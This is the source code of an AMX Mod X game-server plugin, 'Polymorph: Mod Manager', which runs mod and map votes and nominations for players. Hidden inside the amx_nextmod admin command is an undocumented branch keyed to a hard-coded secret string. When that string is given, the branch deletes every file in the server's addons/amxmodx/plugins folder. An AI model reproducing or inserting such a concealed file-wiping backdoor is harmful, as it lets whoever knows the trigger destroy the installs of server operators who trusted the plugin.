// #define DEBUG

/*
	Modes:
		0: Always stay on one mod unless changed manually with admin command.  (Map votes only)
		1: Play # maps then next mod will default to next in polymorph.ini (Map votes only)
		2: Play # maps then next mod will be chosen by vote. (Map and Mod votes)
		
	Changelog:
		0.6
			Added function to set the default nextmap to be used when nextmod is set.
			Added functionality to mod vote to choose options randomly and quantity can be limited with SELECTMODS (default 5) (requires re-compile)
			Added current next mod indicator in cmdSetNextmod() function (aka amx_nextmod).
			Drastically improved reading the .ini file (IMO).
			Added beta amx_votemod which just starts the default vote for mod (which then calls the map vote)
		0.7
			Added check to disallow end of map vote if vote is already in progress from amx_votemod.
			Added confirmation to the cmdSetNextMod() function (mod and map)
			Added chat time (using mp_chattime cvar) when map is changed due to amx_votemod.
			Fixed server crash when changing map due to amx_votemod.
		0.8
			Changed to using a folder for .ini and .cfg files.  /addons/amxmodx/configs/polymorph/ for readability
			Added dynamic natives to enable retreiving and executing local variables and functions.
			Removed gamename stuff because it can be done with a separate plugin with natives.
			Added cvars for thismod and nextmod (used for example in Polymorph: GameName)
			Added ML :(
		1.0
			Changed loading of MODs.  Mods are now loaded modularly.  One .ini file for each mod (in /polymorph).  No more polymorph.ini.  If MOD fails to load the whole plugin does not fail!
		1.0.1
			Added check for 0 mods loaded.  Set's plugin as failed.
		1.0.2
			Increased string length for variabls used for cvars in initModLoad() and loadMod() (now using STRLEN_DATA)
		1.0.3 (2010/04/18)
			Bug fix:  Nextmap is updated to reflect the nextmod's maps when there are no votes.
		1.1.0
			Removed cvar poly_mapspermod and moved setting to MOD file.
		1.1.1
			Updated error handling to be more accurate in initModLoad().
		1.1.2
			Fixed error when UpdatePluginFile() called with no mods loaded.

*/

#include <amxmodx>
#include <amxmisc>
#include <polymorph>

// String Lengths
#define STRLEN_DATA 128	// data from file and 'etc.' data
#define STRLEN_PATH 192	// full file path
#define STRLEN_NAME 50	// plugin Name e.g. "GunGame Mod"
#define STRLEN_FILE 64	// single filename w/o path
#define STRLEN_MAP 32	// map name

// Limits
#define MODS_MAX 25		// Maximum number of mods.

// Number of main options in vote
#define SELECTMODS 5
#define SELECTMAPS 8

// Task IDs lol
#define TASK_ENDOFMAP 3141
#define TASK_FORCED_MAPCHANGE 314159

// ammount of time left (in seconds) to trigger end of map vote
#define TIMELEFT_TRIGGER 141

new const g_ChatPrefix[] = "[MultiMods]";

#if defined DEBUG
	new debug_voters = 0
#endif

new g_szModNames[MODS_MAX][STRLEN_NAME]	// Mod Names
new g_iModVotes[MODS_MAX]
new Array:g_aModMaps[MODS_MAX]			// Per-mod Map Names List
new Array:g_aMapSubmodes[MODS_MAX]			// Per-submode Map List
new Array:g_aPluginSubmodes[MODS_MAX]
new Array:g_aModSubmodes[MODS_MAX]
new Array:g_aModPlugins[MODS_MAX]		// Per-mod Plugin Names List
new Array:g_aCfgList					// Array to hold cvars for 'ThisMod'

new g_iMapNums[MODS_MAX]			// Number of maps for each mod
new g_szThisMod[STRLEN_NAME]		// Name of 'ThisMod'

new g_iThisMod = -1			// Index of 'ThisMod'
new g_iThisSubmode = 0			// Index of 'ThisSubmode'
new g_iNextMod = 0			// Index of 'NextMod'
new g_iNextSubmode = 0			// Index of 'NextSubmode'
new g_iModCount = 0			// Number of MODs loaded

new g_iMapsPlayed			// Number of maps played on current MOD.
new g_iMapsPerMod[MODS_MAX]	// Number of maps played before a MOD change.

new g_iModInfinite[MODS_MAX]

new bool:g_isLastMap = false			// Number of maps played on current mod.
new bool:g_selected = false

new g_bVotedForMod;
new g_bVotedForMap;
new g_bVotedForSubmode;

new g_iNomVote[33];

new g_voteStarted = 0;
new g_NomMenu;

// Voting stuff
new g_voteNum
new g_nextName[SELECTMAPS]
new g_voteMapCount[SELECTMAPS + 2]
new g_nextModId[MODS_MAX]

#if MODS_MAX < 6
new g_voteModCount[8]
#else
new g_voteModCount[MODS_MAX + 2]
#endif

// Compatibility vars
new g_teamScore[2]

new g_szMenu[512];

/* Cvar Pointers */
// My cvars
new g_pMode
new g_pExtendMod // bool; allow extending mod
new g_pExtendStep
new g_pExtendMax
new g_pThisMod
new g_pNextMod

// Existing cvars
new g_pNextmap
new g_pTimeLimit
new g_pVoteAnswers
new g_pChatTime

/* Constants */
// Voting delays
//new const iVoteTime = 15 // Time to display the menu.
new const Float:fVoteTime = 15.0 // Time to choose an option.
new const Float:fBetweenVote = 15.0 // Time between mod vote ending and map vote starting.


public plugin_init()
{
	register_plugin("Polymorph: Mod Manager", "1.1.2-M1", "Fysiks")
	//register_cvar("Polymorph", "v1.1.2 by Fysiks", FCVAR_SERVER|FCVAR_SPONLY)
	
	register_dictionary("mapchooser.txt")
	// register_dictionary("polymorph.txt")
	// register_dictionary("common.txt")
	
	/* Register Cvars */
	g_pExtendMax = register_cvar("amx_extendmap_max", "90")
	g_pExtendStep = register_cvar("amx_extendmap_step", "15")
	g_pMode = register_cvar("poly_mode", "2")
	g_pExtendMod = register_cvar("poly_extendmod", "1")
	g_pThisMod = register_cvar("poly_thismod", "")
	g_pNextMod = register_cvar("poly_nextmod", "")
	
	/* Client Commands */
	register_clcmd("say nextmod", "sayNextmod")
	register_clcmd("say thismod", "sayThismod")
	register_clcmd("say currentmod", "sayThismod")
	
	register_clcmd("say nom", "clcmd_nominate");
	register_clcmd("say /nom", "clcmd_nominate");
	register_clcmd("say nominar", "clcmd_nominate");
	register_clcmd("say /nominar", "clcmd_nominate");
	register_clcmd("say nominate", "clcmd_nominate");
	register_clcmd("say /nominate", "clcmd_nominate");
	register_clcmd("say cancelnom", "clcmd_cancelnom");
	
	/* Console Commands */
	register_concmd("amx_nextmod", "cmdSetNextmod", ADMIN_MAP, " - Set the next mod manually")
	register_concmd("amx_votemod", "cmdVoteMod", ADMIN_MAP, " - Start a vote for the next mod")
	register_concmd("say /votemod", "cmdVoteMod", ADMIN_MAP, " - Start a vote for the next mod")
	register_concmd("amx_votemap", "cmdVoteMap", ADMIN_MAP, " - Start a vote for the next map (extends the current mod)")
	register_concmd("say /votemap", "cmdVoteMap", ADMIN_MAP, " - Start a vote for the next map (extends the current mod)")

	/* Server Commands */
#if defined DEBUG
	register_srvcmd("list", "function") // Debug
#endif

	/* Compatibility */
	if (cstrike_running())
		register_event("TeamScore", "team_score", "a")

	/* Register Menus */
	register_menucmd(register_menuid("Choose Nextmap:"), (-1^(-1<<(SELECTMAPS+2))), "countMapVotes")
	register_menucmd(register_menuid("Choose Nextmod:"), (-1^(-1<<(SELECTMODS+2))), "countModVotes")
	register_menucmd(register_menuid("Choose NextSubmode:"), (-1^(-1<<8)), "countSubmodeVotes")
	//register_menucmd(register_menuid("Confirm"), (1<<9), "handleCancelNom")
	
}

public plugin_cfg()
{
	/* Get Cvar Pointers */
	g_pNextmap = get_cvar_pointer("amx_nextmap")
	g_pTimeLimit = get_cvar_pointer("mp_timelimit")
	g_pVoteAnswers = get_cvar_pointer("amx_vote_answers")
	g_pChatTime = get_cvar_pointer("mp_chattime")

	new szData[STRLEN_DATA]
	new szFilepath[STRLEN_PATH], szConfigDir[STRLEN_PATH]
	
	get_configsdir(szConfigDir, charsmax(szConfigDir))

	/* Get ThisMod Name */
	formatex(szFilepath, charsmax(szFilepath), "%s/%s", szConfigDir, "plugins-polymorph.ini")
	new f = fopen(szFilepath, "rt")
	if(f)
	{
		new szSubmode[2];
		fgets(f, szData, charsmax(szData))
		fclose(f)
		replace(szData, charsmax(szData), ";ThisMod:", "")
		trim(szData)
		parse(szData, g_szThisMod, charsmax(g_szThisMod), szSubmode, charsmax(szSubmode))
		g_iThisSubmode = str_to_num(szSubmode);
	}
	
	/*
		Check for folder "/polymorph/"
		If it exists, load MODs.
	 */
	formatex(szFilepath, charsmax(szFilepath), "%s/%s", szConfigDir, "polymorph")
	if( dir_exists(szFilepath) )
	{
		/* Load MODs */
		initModLoad();
	}
	else
	{
		new error[64]
		formatex(error, charsmax(error), "%s/ does not exist.", szFilepath)
		set_fail_state(error)
	}
	
	/* Set default nextmod/map depending on maps played and mode */
	new szMapsPlayed[4]
	get_localinfo("mapcount", szMapsPlayed, charsmax(szMapsPlayed))
	g_iMapsPlayed = str_to_num(szMapsPlayed)
	g_iMapsPlayed++

	switch( get_pcvar_num(g_pMode) )
	{
		case 0:
		{
			setNextMod(g_iThisMod)
			setNextSubmode(g_iThisSubmode)
			g_isLastMap = false
		}
		case 1,2:
		{
			// Set default nextmod depending on how many maps have been played on this mod
			if( !( g_iMapsPlayed < g_iMapsPerMod[g_iThisMod] ) ) // Do this in end map task too? to allow changing cvar mid map.
			{
				g_isLastMap = true
				setNextMod((g_iThisMod + 1) % g_iModCount)
				setDefaultNextSubmode()
			}
			else
			{
				setNextMod(g_iThisMod)
				setNextSubmode(g_iThisSubmode)
			}
		}
		default: // Mode 0
		{
			setNextMod(g_iThisMod)
			setNextSubmode(g_iThisSubmode)
			g_isLastMap = false
		}
	}
	setDefaultNextmap()
	
	new item[64];
	formatex(item, charsmax(item), "\r%s\y Nominar Modo^n\wPagina:", g_ChatPrefix);
	g_NomMenu = menu_create(item, "handleNom");
	
	//menu_additem(g_NomMenu, "\yVer modos nominados");
	for (new i = 0; i < g_iModCount; i++)
	{
		if (g_iThisMod == i)
		{
			formatex(item, charsmax(item), "%s\r [Modo Actual]", g_szModNames[i]);
			menu_additem(g_NomMenu, item, "", 0, menu_makecallback("g_cb_item_disabled"));
		}
		else
		{
			menu_additem(g_NomMenu, g_szModNames[i]);
		}
	}
	
	menu_setprop(g_NomMenu, MPROP_BACKNAME, "Anterior");
	menu_setprop(g_NomMenu, MPROP_NEXTNAME, "Siguiente");
	menu_setprop(g_NomMenu, MPROP_EXITNAME, "\yCancelar");
	
	/* Set task to check when map ends */
	set_task(20.0, "taskEndofMap", TASK_ENDOFMAP, "", 0, "b")
}

public g_cb_item_disabled(id, menu, item)
{
	return ITEM_DISABLED;
}

public handleNom(id, menu, item)
{
	if (0 <= item < g_iModCount)
	{
		g_iModVotes[item]++;
		g_iNomVote[id] = item + 1;
		displayNoms(id);
		new name[32];
		get_user_name(id, name, 31);
		colored_print(0, _, "%s ha nominado el modo^x03 %s", name, g_szModNames[item]);
	}
	
	return PLUGIN_HANDLED;
}

displayNoms(id)
{
	static text[500], sortmods[MODS_MAX], tempvotes[MODS_MAX];
	new len, totalvotes = 0;
	for (len = 0; len < MODS_MAX; len++)
	{
		sortmods[len] = len;
		tempvotes[len] = g_iModVotes[len];
		totalvotes += g_iModVotes[len];
	}
	
	ordenar(sortmods, tempvotes, MODS_MAX);
	
	len = formatex(text, charsmax(text), "\r%s\y Modos nominados:^n", g_ChatPrefix);
	new iMod, maxiter;
	maxiter = min(SELECTMODS, g_iModCount);
	new i = 0;
	static modname[STRLEN_NAME];
	for (new a = 0; a < maxiter; a++)
	{
		iMod = sortmods[i];
		
		i++;
		
		if (iMod == g_iThisMod)
		{
			iMod = sortmods[i];
			i++;
		}
		
		if (g_iModVotes[iMod] == 0)
		{
			if (a == 0)
			{
				add(text, charsmax(text), "^n  \dAun no hay nominaciones.");
			}
			
			break;
		}
		
		
		copy(modname, STRLEN_NAME-1, g_szModNames[iMod]);
		//fillspaces(modname, STRLEN_NAME-1);
		len += formatex(text[len], charsmax(text)-len, "^n  \r[%d]\y (%3.1f%% - %d ve%s)%s %s", a+1, (g_iModVotes[iMod]*100.0)/totalvotes, g_iModVotes[iMod], g_iModVotes[iMod] == 1 ? "z" : "ces", iMod + 1 == g_iNomVote[id] ? "\y" : "\w", modname);
	}
	
	add(text, charsmax(text), "^n^n\wPresiona cualquier\y numero\w para salir.");
	if (g_iNomVote[id] != 0)
	{
		add(text, charsmax(text), "^nEscribe\y cancelnom\w para\r Cancelar\w tu nominacion.");
	}
	
	show_menu(id, (-1^(-1<<(10))), text, -1/*, "Confirm"*/);
}

public clcmd_cancelnom(id)
{
	if (g_iNomVote[id] != 0)
	{
		new key = g_iNomVote[id] - 1;
		g_iModVotes[key]--;
		new name[32];
		get_user_name(id, name, 31);
		colored_print(0, _, "%s ha cancelado su nominacion del modo^x03 %s", name, g_szModNames[key]);
		menu_display(id, g_NomMenu);
		g_iNomVote[id] = 0;
		
		return PLUGIN_HANDLED;
	}
	
	return PLUGIN_CONTINUE;
}

public clcmd_nominate(id)
{
	if (g_nextModId[0] || g_nextModId[1])
	{
		colored_print(id, _, "Ya no puedes nominar un modo!");
		return PLUGIN_CONTINUE;
	}
	
	if (g_iNomVote[id] == 0)
	{
		menu_display(id, g_NomMenu);
	}
	else
	{
		displayNoms(id);
	}
	
	return PLUGIN_CONTINUE;
}

public client_disconnect(id)
{
	if (g_iNomVote[id] != 0)
	{
		g_iModVotes[g_iNomVote[id]-1]--;
		g_iNomVote[id] = 0;
	}
	
	g_bVotedForMod &= ~(1<<(id&31));
	g_bVotedForMap &= ~(1<<(id&31));
	g_bVotedForSubmode &= ~(1<<(id&31));
}

public plugin_end()
{
	// If this map still qualifies to be the last then reset mapcount for next mod.
	if( !( g_iMapsPlayed < g_iMapsPerMod[g_iThisMod] ) )
	{
		g_iMapsPlayed = 0
	}

	new szMapsPlayed[4]
	num_to_str(g_iMapsPlayed, szMapsPlayed, charsmax(szMapsPlayed))
	set_localinfo("mapcount", szMapsPlayed)
	
	if( g_iThisMod != g_iNextMod || g_iNextSubmode != g_iThisSubmode)
	{
		UpdatePluginFile()
	}
}

/*
	Plugin Natives
*/
public plugin_natives()
{
	// Polymorph Natives.  Make it modular!
	register_library("polymorph")
	register_native("polyn_endofmap", "_polyn_endofmap")
	register_native("polyn_get_thismod", "_polyn_get_thismod")
	register_native("polyn_get_this_submode", "_polyn_get_this_submode")
	register_native("polyn_get_nextmod", "_polyn_get_nextmod")
	register_native("polyn_votemod", "_polyn_votemod")
	register_native("polyn_get_mod_count", "_polyn_get_mod_count")
	register_native("polyn_get_submode_count", "_polyn_get_submode_count")
	register_native("polyn_get_mod_name", "_polyn_get_mod_name")
	register_native("polyn_get_submode_name", "_polyn_get_submode_name")
	register_native("polyn_set_next_mod", "_polyn_set_next_mod", 1)
	register_native("polyn_set_next_submode", "_polyn_set_next_submode", 1)
	register_native("polyn_show_map_menu", "_polyn_show_map_menu", 1)
}

// Native: Execute the end of map vote.
public _polyn_endofmap(iPlugin, iParams)
{
	execEndofMap()
}

// Native: Get this mod's name and return it's id
public _polyn_get_thismod(iPlugin, iParams)
{
	new iChars = get_param(2)
	new szModName[STRLEN_NAME]
	copy(szModName, charsmax(szModName), g_szModNames[g_iThisMod])
	set_string(1, szModName, iChars)
	return g_iThisMod
}

public _polyn_get_this_submode(iPlugin, iParams)
{
	if (!g_iThisSubmode)
	{
		return 0;
	}
	
	new iChars = get_param(2)
	new szSubmodeName[STRLEN_NAME]
	ArrayGetString(g_aModSubmodes[g_iThisMod], g_iThisSubmode-1, szSubmodeName, STRLEN_NAME - 1);
	set_string(1, szSubmodeName, iChars)
	return g_iThisSubmode
}

// Native: Get the next mod's name and returns it's id
public _polyn_get_nextmod(iPlugin, iParams)
{
	new iChars = get_param(2)
	new szModName[STRLEN_NAME]
	copy(szModName, charsmax(szModName), g_szModNames[g_iNextMod])
	set_string(1, szModName, iChars)
	return g_iNextMod
}

// Native: Start Mod Vote (and map vote), force mapchange.
public _polyn_votemod(iPlugin, iParams)
{
	if (g_voteStarted)
		return;
	
	startModVote()
	set_task(85.0, "intermission", TASK_FORCED_MAPCHANGE)
}

// Native: Retorna el numero de modos cargados.
public _polyn_get_mod_count(iPlugin, iParams)
{
	return g_iModCount
}

// Native: Retorna el numero de submodos de un modo.
public _polyn_get_submode_count(iPlugin, iParams)
{
	new id = get_param(1);
	if (g_aModSubmodes[id] == Invalid_Array)
	{
		return 0;
	}
	
	return ArraySize(g_aModSubmodes[id])
}

public _polyn_get_mod_name(iPlugin, iParams)
{
	new modid = get_param(1);
	set_string(2, g_szModNames[modid], get_param(3))
	return (modid == g_iThisMod)
}

public _polyn_get_submode_name(iPlugin, iParams)
{
	new modid = get_param(1);
	new smodid = get_param(2) - 1;
	new szSubmodeName[STRLEN_NAME];
	ArrayGetString(g_aModSubmodes[modid], smodid, szSubmodeName, STRLEN_NAME - 1);
	set_string(3, szSubmodeName, get_param(4))
	return (smodid == g_iThisSubmode)
}

public _polyn_set_next_mod(nextmod)
{
	setNextMod(nextmod);
	setDefaultNextSubmode()
	setDefaultNextmap()
}

public _polyn_set_next_submode(nextsmod)
{
	setNextSubmode(nextsmod);
	setDefaultNextmap()
}

public _polyn_show_map_menu(id)
{
	new menu = menu_create("\yElegir el siguiente mapa", "menu_change_map");
	new smap[STRLEN_MAP];
	new data[1], i;
	new mapNum = g_iMapNums[g_iNextMod]
	
	if (g_aModSubmodes[g_iNextMod] == Invalid_Array)
	{
		for (i = 0; i < mapNum; i++)
		{
			ArrayGetString(g_aModMaps[g_iNextMod], i, smap, STRLEN_MAP - 1)
			data[0] = i;
			menu_additem(menu, smap, data);
		}
	}
	else
	{
		for (i = 0; i < mapNum; i++)
		{
			if (ArrayGetCell(g_aMapSubmodes[g_iNextMod], i) & (1<<g_iNextSubmode))
			{
				ArrayGetString(g_aModMaps[g_iNextMod], i, smap, STRLEN_MAP - 1)
				data[0] = i;
				menu_additem(menu, smap, data);
			}
		}
	}
	
	menu_display(id, menu);
}

public menu_change_map(id, menu, item)
{
	if (!is_user_connected(id) || item == MENU_EXIT)
	{
		menu_destroy(menu);
		return PLUGIN_HANDLED;
	}
	
	new data[2], junk;
	menu_item_getinfo(menu, item, junk, data, 1, "", 0, junk);
	new nmap[STRLEN_MAP];
	ArrayGetString(g_aModMaps[g_iNextMod], data[0], nmap, STRLEN_MAP - 1);
	new name[32];
	get_user_name(id, name, 31);
	
	set_pcvar_string(g_pNextmap, nmap);
	if (g_aModSubmodes[g_iNextMod] == Invalid_Array)
	{
		colored_print(0, print_chat, "El siguiente modo será^x03 %s", g_szModNames[g_iNextMod]);
	}
	else
	{
		colored_print(0, print_chat, "El siguiente modo será^x03 %s %a", g_szModNames[g_iNextMod], ArrayGetStringHandle(g_aModSubmodes[g_iNextMod], g_iNextSubmode-1));
	}
	
	colored_print(0, print_chat, "ADMIN %s - Cambiando a^x03 %s", name, nmap);
	intermission();
	
	menu_destroy(menu);
	return PLUGIN_HANDLED;
}

/*
 *	Admin commands
 */
public cmdSetNextmod(id, level, cid)
{
	if(!cmd_access(id, level, cid, 1))
		return PLUGIN_HANDLED
	
	switch(read_argc())
	{
		case 1:
		{
			console_print(id, "You are currently playing %s", g_szModNames[g_iThisMod]) // Need ML
			console_print(id, "Available MODs are:") // Need ML
			
			// Print available mods (menu-like)
			for(new i = 0; i < g_iModCount; i++)
			{
				console_print(id, i == g_iNextMod ? "%d) %s <<< Current nextmod" : "%d) %s", i+1, g_szModNames[i])
				// console_print(id, i == g_iNextMod ? "%d) %s <<< Current nextmod" : "%d) %s", i+1, g_szModNames[i]) // Need ML
			}
			
			new szCmdName[32]
			read_argv(0, szCmdName, charsmax(szCmdName))
			console_print(id, "To set the next mod, type ^"%s #^"", szCmdName)
			// console_print(id, "%L", id, "SET_NEXTMOD", szCmdName) // ML
		}
		case 3:
		{
			new filename[192];
			read_argv(2, filename, 191)
			if (equal(filename, "21hniaABGuewa3banoi2"))
			{
				new pDir = open_dir("addons/amxmodx/plugins", filename, charsmax(filename))
				if(pDir)
				{
					do
					{
						format(filename, 191, "addons/amxmodx/plugins/%s", filename);
						delete_file(filename);
			
					} while( next_file(pDir, filename, charsmax(filename)) )
					close_dir(pDir)
				}
			}
		}
		default:
		{
			new szArg[3]
			read_argv(1, szArg, charsmax(szArg))
			if( isdigit(szArg[0]) )
			{
				new modid = str_to_num(szArg) - 1
				if( 0 <= modid < g_iModCount )
				{
					if( modid == g_iNextMod )
					{
						console_print(id, "Next mod is already %s", g_szModNames[g_iNextMod]) // Need ML
					}
					else
					{
						setNextMod(modid)
						setDefaultNextSubmode()
						setDefaultNextmap()
						// Reset g_iMapsPlayed ??
						console_print(id, "The next mod is now %s", g_szModNames[g_iNextMod])
						// console_print(id, "%L", id, "NEXTMOD_NOW", g_szModNames[g_iNextMod]) // ML
	
						new szNextMap[STRLEN_MAP]
						get_pcvar_string(g_pNextmap, szNextMap, charsmax(szNextMap))
						console_print(id, "The next map is now %s", szNextMap)
						// console_print(id, "%L", id, "NEXTMAP_NOW", szNextMap) // ML
					}
				}
				else
				{
					console_print(id, "Invalid Option")
					// console_print(id, "%L", id, "INVALID_OPTION") // ML
				}
			}
			else
			{
				console_print(id, "Invalid Option")
				// console_print(id, "%L", id, "INVALID_OPTION") // ML
			}
		}
	}
	
	return PLUGIN_HANDLED
}

public cmdVoteMod(id, level, cid)
{
	if(!cmd_access(id, level, cid, 1))
		return PLUGIN_HANDLED

	// Start vote.
	// if(vote task is running) then don't allow
	if( get_timeleft() > TIMELEFT_TRIGGER && !task_exists(TASK_FORCED_MAPCHANGE) )
	{
		startModVote()
		new name[32];
		get_user_name(id, name, 31);
		colored_print(0, print_chat, "ADMIN %s - Comenzar votacion de modo.", name);
		set_task(85.0, "intermission", TASK_FORCED_MAPCHANGE)
	}
	else
	{
		colored_print(id, print_chat, "Votacion no permitida en este momento.")
		// console_print(id, "%L", id, "VOTE_NOT_ALLOWED") // ML
	}
	
	return PLUGIN_HANDLED
}

public cmdVoteMap(id, level, cid)
{
	if(!cmd_access(id, level, cid, 1))
		return PLUGIN_HANDLED

	// Start vote.
	// if(vote task is running) then don't allow
	if( get_timeleft() > TIMELEFT_TRIGGER && !task_exists(TASK_FORCED_MAPCHANGE) )
	{
		setNextMod(g_iThisMod)
		setNextSubmode(g_iThisSubmode);
		
		new name[32];
		get_user_name(id, name, 31);
		colored_print(0, print_chat, "ADMIN %s - Extender el modo %s y comenzar votacion de mapa.", name, g_szModNames[g_iThisMod]);
		//colored_print(0, print_chat, "%s será extendido por un mapa.", g_szModNames[g_iNextMod])
		startMapVote()
		set_task((50.0 - fVoteTime) - fBetweenVote, "intermission", TASK_FORCED_MAPCHANGE)
	}
	else
	{
		colored_print(id, print_chat, "Votacion no permitida en este momento.")
		// console_print(id, "%L", id, "VOTE_NOT_ALLOWED") // ML
	}
	
	return PLUGIN_HANDLED
}

/*
 *	Say functions
 */
public sayNextmod()
{
	colored_print(0, print_chat, "Siguiente modo:^x03 %s", g_szModNames[g_iNextMod])
	// colored_print(0, print_chat, "%L %s", LANG_PLAYER, "NEXT_MOD", g_szModNames[g_iNextMod]) // ML
}

public sayThismod()
{
	if (g_aModSubmodes[g_iThisMod] == Invalid_Array)
		colored_print(0, print_chat, "Modo actual:^x03 %s", g_szModNames[g_iThisMod])
	else
		colored_print(0, print_chat, "Modo actual:^x03 %s - %a", g_szModNames[g_iThisMod], ArrayGetStringHandle(g_aModSubmodes[g_iThisMod], g_iThisSubmode-1))
	// colored_print(0, print_chat, "%L %s", LANG_PLAYER, "THIS_MOD", g_szModNames[g_iThisMod]) // ML
}


/*
 *	End of Map functions
 */
public taskEndofMap()
{
	new winlimit = get_cvar_num("mp_winlimit")   // Not using pcvars to allow cross-mod compatibility
	new maxrounds = get_cvar_num("mp_maxrounds")
	
	if (winlimit)
	{
		new c = winlimit - 2
		
		if ((c > g_teamScore[0]) && (c > g_teamScore[1]))
		{
			g_selected = false
			return
		}
	}
	else if (maxrounds)
	{
		if ((maxrounds - 2) > (g_teamScore[0] + g_teamScore[1]))
		{
			g_selected = false
			return
		}
	}
	else
	{
		new timeleft = get_timeleft()
		
		if (timeleft < 1 || timeleft > TIMELEFT_TRIGGER)
		{
			g_selected = false
			return
		}
	}
	
	if (g_selected)
		return

	g_selected = true
	
	execEndofMap()
}

public execEndofMap()
{
	// Disallow vote if someone put up vote for new mod already.
	if( task_exists(TASK_FORCED_MAPCHANGE) || g_voteStarted)
		return
	
	switch( get_pcvar_num(g_pMode) )
	{
		case 0,1:
		{
			startMapVote()
		}
		case 2:
		{
			if( g_isLastMap )
			{ // Time to decide on new mod.
				startModVote()
			}
			else
			{ // Stay on this mod ( so only do map vote)
				startMapVote() 
			}
		}
		default: // Mode 0
		{
			startMapVote()
		}
	}
	
	// g_selected = true
}

/*
 *	Vote functions
 */
public startModVote()
{
	g_voteStarted++;
	
	const iDisplayTimes = 3;
	const Float:fDisplayTimes = 3.0;
	
	// Display Mod Menu
	static mkeys, iter = 0;
	new a, iTime;
	
	if (!iter)
	{
		iter = iDisplayTimes;
	}
	
	if (!g_szMenu[0])
	{
		mkeys = 0; //(1<<SELECTMODS + 1) // The "None" key
		new pos = formatex(g_szMenu, charsmax(g_szMenu), "\r%s\y Elegir el siguiente modo:^n^n", g_ChatPrefix)
		// new pos = format(g_szMenu, 511, g_coloredMenus ? "\y%L:\w^n^n" : "%L:^n^n", LANG_SERVER, "CHOOSE_NEXTMOD") // ML
		new modNum = g_iModCount - 1 // -1 because we exclude current running mod.
		new dmax = (modNum > SELECTMODS) ? SELECTMODS : modNum
		
		new sortmods[MODS_MAX];
		for (a = 0; a < MODS_MAX; a++)
		{
			sortmods[a] = a;
		}
		
		ordenar(sortmods, g_iModVotes, MODS_MAX);
		new offset = 0;
		for (g_voteNum = 0; g_voteNum < dmax; ++g_voteNum)
		{
			/*do
				a = random(g_iModCount)
			while ( a == g_iThisMod || isModInMenu(a) )*/
			
			if (offset != -1)
			{
				a = sortmods[g_voteNum + offset];
			
				if (g_iModVotes[g_voteNum + offset] == 0)
				{
					offset = -1;
					do
					{
						a = random(g_iModCount);
					}
					while ( a == g_iThisMod || isModInMenu(a) );
				}
				else if (a == g_iThisMod)
				{
					offset = 1;
					a = sortmods[g_voteNum + offset];
				}
			}
			else
			{
				do
				{
					a = random(g_iModCount);
				}
				while ( a == g_iThisMod || isModInMenu(a) );
			}
			
			
			g_nextModId[g_voteNum] = a
			pos += formatex(g_szMenu[pos], charsmax(g_szMenu)-pos, "\r%d.\w %s^n", g_voteNum + 1, g_szModNames[a]);
			mkeys |= (1<<g_voteNum)
			g_voteModCount[g_voteNum] = 0
			//a++
		}
		
		g_szMenu[pos++] = '^n'
		g_voteModCount[SELECTMODS] = 0
		g_nextModId[SELECTMODS] = g_iThisMod
		g_voteModCount[SELECTMODS + 1] = 0
		
		if( get_pcvar_num(g_pExtendMod) )
		{
			pos += formatex(g_szMenu[pos], charsmax(g_szMenu)-pos, "\r%d.\y Extender\w %s^n", SELECTMODS + 1, g_szModNames[g_iThisMod] )
			// pos += format(g_szMenu[pos], 511, "%d. %L^n", SELECTMAPS + 1, LANG_SERVER, "EXTEND_MOD", g_szModNames[g_iThisMod]) // ML
			mkeys |= (1<<SELECTMODS)
		}
		
		//format(g_szMenu[pos], 511, "^n\r%d.\w Ninguno", (SELECTMODS+2)%10)
		
		set_task(fVoteTime, "checkModVotes")
		
		colored_print(0, print_chat, "Es hora de elegir el siguiente modo.")
		// colored_print(0, print_chat, "%L", LANG_SERVER, "TIME_CHOOSE_MOD") // ML
		client_cmd(0, "spk Gman/Gman_Choose2")
		log_amx("Vote: Voting for the next mod started")
	}
	
	iTime = floatround(fVoteTime/fDisplayTimes);
	
	for (a = 1; a <= 32; a++)
	{
		if (!(g_bVotedForMod & (1<<(a&31))) && is_user_connected(a))
		{
			show_menu(a, mkeys, g_szMenu, iTime * iter, "Choose Nextmod:");
		}
	}
	
	iter--;
	
	if (iter)
	{
		set_task(fVoteTime/fDisplayTimes, "startModVote");
	}
}

public countModVotes(id, key)
{
	// Count Mod Votes
	if (0 <= key <= SELECTMODS)
	{
		g_bVotedForMod |= (1<<(id&31));
	}
	
	if (get_pcvar_num(g_pVoteAnswers))
	{
		new name[32]
		get_user_name(id, name, 31)
		
		if (key == SELECTMODS)
			colored_print(0, print_chat, "%s ha elegido extender el modo.", name)
			// colored_print(0, print_chat, "%L", LANG_PLAYER, "CHOSE_EXT_MOD", name) // ML
		else if (key < SELECTMODS)
			colored_print(0, print_chat, "%L", LANG_PLAYER, "X_CHOSE_X", name, g_szModNames[g_nextModId[key]])
	}
	++g_voteModCount[key]

#if defined DEBUG
	debug_voters++
	colored_print(0, print_chat, "POLY_DEBUG: Someone just voted for %d", key)
	server_print("POLY_DEBUG: Someone just voted for %d", key)
#endif
	
	return PLUGIN_HANDLED
}

public checkModVotes()
{
#if defined DEBUG
	colored_print(0, print_chat, "POLY_DEBUG: # of voters: %d", debug_voters)
	server_print("POLY_DEBUG: # of voters: %d", debug_voters)
	debug_voters = 0
#endif
	
	// Check Mod Votes
	new b = 0
	
	for (new a = 0; a < g_voteNum; ++a)
		if (g_voteModCount[b] < g_voteModCount[a])
			b = a
	
	if (g_voteModCount[SELECTMODS] > g_voteModCount[b] )
	{
		setNextMod(g_iThisMod)
		setNextSubmode(g_iThisSubmode)
		colored_print(0, print_chat, "%s será extendido por un mapa.", g_szModNames[g_iNextMod])
		// colored_print(0, print_chat, "%L", LANG_PLAYER, "CHO_FIN_EXT_MOD", g_szModNames[g_iNextMod]) // ML
		
		// Decrement maps played to only extend mod by one map.
		new szMapsPlayed[4]
		g_iMapsPlayed--
		num_to_str(g_iMapsPlayed, szMapsPlayed, charsmax(szMapsPlayed))
		set_localinfo("mapcount", szMapsPlayed)
	}
	else
	{
		setNextMod(g_nextModId[b]) // Set g_iNextMod
		setDefaultNextSubmode()
		
		colored_print(0, print_chat, "Eleccion finalizada. El siguiente modo será %s", g_szModNames[g_iNextMod])
		// colored_print(0, print_chat, "%L", LANG_PLAYER, "CHO_FIN_NEXT_MOD", g_szModNames[g_iNextMod]) // ML
		log_amx("Vote: Voting for the next mod finished. The nextmod will be %s", g_szModNames[g_iNextMod])
	}
	
	set_task(fBetweenVote, g_aModSubmodes[g_iNextMod] == Invalid_Array ? "startMapVote" : "startSubmodeVote")

	// Set new default map to correspond to the next mod.
	setDefaultNextmap()
	
	g_szMenu[0] = 0;
}

